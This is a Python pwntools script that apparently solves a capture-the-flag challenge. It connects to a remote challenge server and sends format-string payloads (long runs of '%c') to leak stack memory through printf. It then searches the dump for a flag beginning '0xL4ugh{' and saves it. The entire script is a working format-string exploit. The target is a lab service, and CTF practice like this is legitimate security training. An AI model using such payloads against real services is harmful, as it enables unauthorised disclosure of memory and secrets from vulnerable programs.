#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)

r.recvuntil(b"Clue: ")
leak = r.recvline().strip()
log.info(f"Leaked: {leak}")

r.recvuntil(b"Write your path:")

# Max safe %c for first printf
payload1 = b"%c" * 125
r.sendline(payload1)

response1 = r.recvuntil(b"Wrong path... try again:", timeout=3)
log.info(f"First dump: {len(response1)} bytes")

# Second printf with max %c (3 gives us 6 bytes: "%c%c%c")
payload2 = b"%c%c%c"
r.sendline(payload2)

response2 = r.recvall(timeout=2)
log.info(f"Second dump: {len(response2)} bytes")

# Combine and search
full_dump = response1 + response2

with open('complete_dump.bin', 'wb') as f:
    f.write(full_dump)

# Final search
if b"0xL4ugh{" in full_dump:
    idx = full_dump.find(b"0xL4ugh{")
    end = full_dump.find(b"}", idx)
    if end > idx:
        flag = full_dump[idx:end+1]
        log.success(f"\n\n***** FLAG: {flag.decode()} *****\n\n")
        with open('FLAG.txt', 'w') as f:
            f.write(flag.decode())
    else:
        log.info(f"Partial flag: {full_dump[idx:idx+50]}")
else:
    log.warning("Flag not found in combined dump")
    print("\nFull hexdump:")
    print(hexdump(full_dump[:300]))

r.close()
